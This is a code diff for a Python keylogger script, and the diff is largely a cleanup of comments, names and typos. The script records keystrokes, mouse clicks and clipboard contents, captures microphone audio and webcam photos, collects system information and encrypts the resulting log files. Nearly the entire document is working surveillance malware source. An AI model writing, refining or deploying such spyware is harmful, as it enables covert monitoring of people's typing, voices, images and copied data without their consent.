@@ -19,20 +19,27 @@ from pynput import keyboard, mouse
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
 
+WEBCAM= 'WebcamPics'
 LOG_FILE = "keylogfile.txt"
 CLIPBOARD = "clipboard.txt"
+WAVE_OUTPUT_FILENAME = "output.wav"
 CHUNK = 4096
 FORMAT = pyaudio.paInt32
 CHANNELS = 2
 RATE = 48000
-WAVE_OUTPUT_FILENAME = "output.wav"
 
+#Initialize PyAudio
 audio = pyaudio.PyAudio()
+
+#Event to control Threads
 stop_thread = threading.Event()
 
+#Setup logs files
 def setup_logging():
     logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')
 
+
+#Get system information
 def get_system_info():
     info = {}
     try:
@@ -51,6 +58,7 @@ def get_system_info():
 
     return info
 
+# Log system information
 def log_system_info():
     info = get_system_info()
     for key, value in info.items():
@@ -58,16 +66,11 @@ def log_system_info():
     logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")
 
 
+# Handler for key press event
 def on_press(key):
     logging.info(f"[Key Pressed] - {key}")
 
-
-def on_release(key):
-    if key == Key.esc:
-        print("Stopping the script.")
-        stop_thread.set()
-        return False
-
+# Handler for mouse click event
 def on_click(button, pressed):
     if pressed:
         if button == mouse.Button.left:
@@ -78,7 +81,16 @@ def on_click(button, pressed):
             logging.info('[Mouse Click] - Middle Click')
 
 
-def start_audio_recording():
+# Stop the script
+def on_release(key):
+    if key == Key.esc:
+        print("Stopping the script.")
+        stop_thread.set()
+        return False
+
+
+# Audio Recording
+def Audio():
     try:
         stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
         with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
@@ -98,9 +110,11 @@ def start_audio_recording():
     finally:
         audio.terminate()
 
+
+# Capture images from webcam
 def webcam():
     try:
-        pathlib.Path('WebcamPics').mkdir(parents=True, exist_ok=True)
+        pathlib.Path(WEBCAM).mkdir(parents=True, exist_ok=True)
         cam_path = 'WebcamPics\\'
         cam = cv2.VideoCapture(0)
         for x in range(0, 10):
@@ -117,7 +131,7 @@ def webcam():
     except Exception as e:
         print("WebcamPics could not be saved: " + str(e))
 
-
+# Monitor clipboard
 def clipboard():
     previous_clipboard_data = ""  # Store the previous clipboard content
     
@@ -142,6 +156,7 @@ def clipboard():
             file.write("\n Clipboard could not be copied: " + str(e) + "\n")
 
 
+# Encrypt files
 def encrypt(file_path):
     # Load the key from the file
     with open('keyfile.key', 'rb') as filekey:
@@ -159,18 +174,24 @@ def encrypt(file_path):
         encrypted_file.write(encrypted)
 
 
+# Main function
 def main():
     try:
         setup_logging()
         log_system_info()
 
+        # Start threads for clipboard, webcam, and audio recording
+        t1 = threading.Thread(target=clipboard)
+        t2 = threading.Thread(target=webcam)
+        t3 = threading.Thread(target=Audio)
 
-        t1 = threading.Thread(target=clipboard) ; t1.start()
-        t2 = threading.Thread(target=webcam) ; t2.start()
-        t3 = threading.Thread(target=start_audio_recording) ; t3.start()
+        t1.start()
+        t2.start()
+        t3.start()
 
-
-        with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
+        # Start the keyboard and mouse listeners
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, \
+             mouse.Listener(on_click=on_click) as mouse_listener:
             print("Script started. Press 'Esc' to stop.")
             key_listener.join()
             mouse_listener.stop()
@@ -187,7 +208,7 @@ def main():
         logging.exception(f"An error occurred: {str(e)}")
 
     finally:
-        # Ensure audio is terminated and threads are joined
+        # Ensure stop_thread is set and threads are joined
         stop_thread.set()
         t1.join()
         t2.join()
@@ -197,8 +218,8 @@ if __name__ == '__main__':
     try:
         if os.path.exists("keyfile.key"):
             main()
-        else :
-            print("You forget to generate the Key x)")
+        else:
+            print("You forgot to generate the Key x)")
 
     except KeyboardInterrupt:
-        print(" Control-C entered...Program exiting ")
+        print("Control-C entered... Program exiting")
